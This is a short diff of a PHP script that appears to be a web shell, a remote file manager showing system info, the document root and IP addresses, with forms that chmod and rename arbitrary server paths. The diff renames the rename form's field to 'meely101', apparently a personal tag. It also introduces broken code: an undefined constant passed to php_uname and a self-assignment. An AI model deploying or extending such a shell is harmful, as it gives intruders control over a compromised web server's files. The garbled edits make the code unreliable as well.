@@ -128,7 +128,7 @@ if($i != $id) echo "/";
 echo '">'.$pat.'</a>/';
 }
 echo '</td></tr><tr><td>';
-$sys = php_uname();
+$sys = php_uname(meely101);
 $home_r = $_SERVER['DOCUMENT_ROOT'];
 $ip = gethostbyname($_SERVER['HTTP_HOST']);
 $ipmu = gethostbyname($_SERVER['REMOTE_ADDR']);
@@ -273,16 +273,16 @@ Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o
 <input type="submit" value="Go" />
 </form>';
 }elseif($_POST['opt'] == 'rename'){
-if(isset($_POST['newname'])){
-if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
+if(isset($_POST['meely101'])){
+if(rename($_POST['path'],$path.'/'.$_POST['meely101'])){
 echo '<font color="#FFFFFF">Rename OK</font><br/>';
 }else{
 echo '<font color="#B0B0B0">Rename ERROR!</font><br />';
 }
-$_POST['name'] = $_POST['newname'];
+$_POST['meely101'] = $_POST['meely101'];
 }
 echo '<form method="POST">
-New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
+New Name : <input name="meely101" type="text" size="20" value="'.$_POST['name'].'" />
 <input type="hidden" name="path" value="'.$_POST['path'].'">
 <input type="hidden" name="opt" value="rename">
 <input type="submit" value="Go" />
